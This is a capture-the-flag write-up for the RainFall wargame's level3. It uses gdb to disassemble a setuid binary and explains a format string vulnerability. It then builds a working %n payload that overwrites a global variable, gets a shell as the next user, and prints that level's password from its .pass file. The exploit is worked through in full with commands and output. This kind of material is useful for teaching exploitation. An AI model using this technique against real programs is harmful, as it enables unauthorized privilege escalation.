# level3

First, let's analyse the binary :

```
level3@RainFall:~$ file level3
level3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x09ffd82ec8efa9293ab01a8bfde6a148d3e86131, not stripped
level3@RainFall:~$ gdb level3
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   ebp
   0x0804851b <+1>:	mov    ebp,esp
   0x0804851d <+3>:	and    esp,0xfffffff0
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave  
   0x08048526 <+12>:	ret    
End of assembler dump.
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x218
   0x080484ad <+9>:	mov    eax,ds:0x8049860
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:	lea    eax,[ebp-0x208]
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    eax,ds:0x8049880
   0x080484e9 <+69>:	mov    edx,eax
   0x080484eb <+71>:	mov    eax,0x8048600
   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.
(gdb) 
```

Okay. So now it looks like we are not going to exploit a buffer overflow vulnerability : this time the programmer wisely choosed `fgets`, which accepts a size limit, `0x200` in our case. Also, the buffer looks wide enough to accomodate `0x200` bytes : `sub esp,0x218`.

But looking downward a few instructions, he does something extremely unsafe, which is feeding our buffer directly to the `printf` function :

```
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
```

Keeping that in mind, let's continue.

```
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
```

These instructions perform an equality check between a value stored at address `0x804988c` and the immediate data `0x40`. We can assume that this is a global variable, located into the data segment.
If this test does not pass, the function simply return, otherwise, it uses the C library call `system` to spawn a shell.

**Our exploit will have to modify the global variable stored at address `0x804988c`, and put the value `0x40` in it in order to have access to the shell.**

But how ?

## String format vulnerability

Remember when I mentioned that feeding unsanitized user input into a printf-family function is a very bad idea? This is known as a format string vulnerability. By allowing a user to control the format string, we give them the ability to read and even write **arbitrary memory** within the process. With a well-crafted exploit, an attacker can perform a full *memory dump* of the process.

The behavior of C's formatted output functions is controlled by the format string. These functions retrieve the arguments specified in the format string from the stack. Notably, the format string itself is also stored on the stack—it's the first argument passed to the function.

For example, the following input prints 64 consecutive 32-bit values from the stack:

```bash
level3@RainFall:~$ python -c 'print("%08x " * 64)' | ./level3
00000200 b7fd1ac0 b7ff37d0 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025 38302520 30252078 25207838 20783830 78383025
```

From the output, we can see the contents of the buffer filled by `fgets` (our input), as well as the buffer size used by fgets earlier, which in this case is **0x200**.

But it doesn’t stop there—we can also write to memory! This is where the %n format specifier comes into play.

> %n is a special format specifier that, instead of printing a value, instructs printf to store the number of characters printed so far into the memory location pointed to by the corresponding argument.

To see this in action, we can try supplying a simple %n as input to our program and observe what happens.

```
level3@RainFall:~$ gdb level3 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) run < <(python -c 'print("%n")')
Starting program: /home/user/level3/level3 < <(python -c 'print("%n")')

Program received signal SIGSEGV, Segmentation fault.
0xb7e7312c in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/2i $eip
=> 0xb7e7312c <vfprintf+19020>:	mov    %edi,(%eax)
   0xb7e7312e <vfprintf+19022>:	jmp    0xb7e6ee8a <vfprintf+1962>
(gdb) i r edi
edi            0x0	0
(gdb) i r eax
eax            0x200	512
(gdb)
```

We see that the program attempts to write the value **0x0** to memory address **0x200**.

Recall that **0x200** was the first value printed using the %x specifier.
The value **0x0** is written because printf has not printed any characters before encountering `%n`.

By carefully specifying multiple format specifiers, we can advance printf’s internal stack pointer, allowing us to select and manipulate other values on the stack :

```
level3@RainFall:~$ gdb level3 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) run < <(python -c 'print("%x%x%n")')
Starting program: /home/user/level3/level3 < <(python -c 'print("%x%x%n")')

Program received signal SIGSEGV, Segmentation fault.
0xb7e7312c in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/2i $eip
=> 0xb7e7312c <vfprintf+19020>:	mov    %edi,(%eax)
   0xb7e7312e <vfprintf+19022>:	jmp    0xb7e6ee8a <vfprintf+1962>
(gdb) i r edi
edi            0xb	11
(gdb) i r eax
eax            0xb7ff37d0	-1208010800
```

So far, we are using values in the stack that we did not choose to use. But the buffer that `prinf` uses is on the stack ! We can actually choose where we want to write in the process memory :

```
(gdb) run < <(python -c 'print("\xEF\xBE\xAD\xDE" + "%x%x%x%n")')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level3/level3 < <(python -c 'print("\xEF\xBE\xAD\xDE" + "%x%x%x%n")')

Program received signal SIGSEGV, Segmentation fault.
0xb7e7312c in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/2i $eip
=> 0xb7e7312c <vfprintf+19020>:	mov    %edi,(%eax)
   0xb7e7312e <vfprintf+19022>:	jmp    0xb7e6ee8a <vfprintf+1962>
(gdb) i r edi
edi            0x17	23
(gdb) i r eax
eax            0xdeadbeef	-559038737
```

I choosed the format specifier `%x%x%x%n` because we have to *advance* printf's internal stack pointer by 3, so `%n` would write to our `0xDEADBEEF` address.

## Putting It All Together

Our goal is to overwrite a global variable located at address `0x804988c` instead of writing to `0xDEADBEEF`.

- Use the %n specifier to store the number of characters printf has processed.
- Ensure printf processes exactly **0x40 (64)** characters before executing `%n`, so that **0x40** is written to `0x804988c`.

Each character printed counts as 1 byte.

The memory address is 32-bit, meaning it takes up 4 bytes.

The format string `%08x%08x%08x%n` prints three 8-character hex values, totaling **8 × 3 = 24 bytes**.

To reach 64 characters in total, we calculate the padding needed:

```
x + 4 + 24 = 64
x = 36
```

```
[global variable address][junk characters][format specifiers]
            4                   36                 24
```

Using Python to generate the payload `python -c 'print("\x8c\x98\x04\x08" + "#"*36 + "%08x%08x%08x%n")'` :

```
level3@RainFall:~$ (python -c 'print("\x8c\x98\x04\x08" + "#"*36 + "%08x%08x%08x%n")'; cat) | ./level3
�####################################00000200b7fd1ac0b7ff37d0
Wait what?!
whoami
level4
cd ../level4
cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
level3@RainFall:~$ 
```

Success !